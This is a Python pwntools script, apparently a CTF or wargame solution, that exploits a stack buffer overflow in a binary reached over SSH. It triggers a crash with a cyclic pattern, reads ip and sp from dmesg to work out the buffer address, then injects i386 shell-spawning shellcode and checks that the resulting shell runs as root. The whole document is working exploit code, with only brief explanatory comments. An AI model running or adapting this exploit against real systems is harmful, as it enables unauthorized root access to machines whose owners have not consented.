from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

# trigger a crash with a pattern
p = s.system(args.BIN)
p.sendline(cyclic(0x100))
assert p.recv() == 'Segmentation fault\n'
p.close()

# parse "segfault at 61616174 ip 61616174 sp bffffd00 error 4"
# NOTE: sp is different with gdb or bash
p = s.system('dmesg | grep %s | tail -n 1' % op.basename(args.BIN))
p.recvuntil('segfault at ')
report = p.recvline().split()
assert (report[1], report[3]) == ('ip', 'sp')
ip, sp = int(report[2], 16), int(report[4], 16)
log.info('ip: %08x', ip)
log.info('sp: %08x', sp)
p.close()

# reconstruct eax (pointer to the user buffer before call to gets()) just like
# main() does. sp is the value after main's ret. -4 because ret poped ip from
# the stack, and -4 again to account for the push ebp at the start of main. The
# rest corresponds to what's found in main() to build gets's argument as eax.
#
#   .-- eax (buf, shellcode, 61616161)                our ip target (61616174)
#   v                                                            v
#   | 0x50 - 0x10 | align (& ~0xF) | ebp pushed by main | __lib_start_main |
#
x = ((sp - 8) & ~0xf) - 0x50 + 0x10

# WARN: the shellcode pushes on the stack and will overlap with sp if too
# large. This typically happens with nops as initial padding.
sh = asm(shellcraft.i386.linux.sh())
ip_off = cyclic_find(ip)
payload = fit({0: sh, ip_off: x})

p = s.system(args.BIN)
p.sendline(payload)
p.recv()  # read prompt
p.sendline('whoami')
whoami = p.recvline().strip()
log.info('whoami: %s', whoami)
assert whoami == 'root'
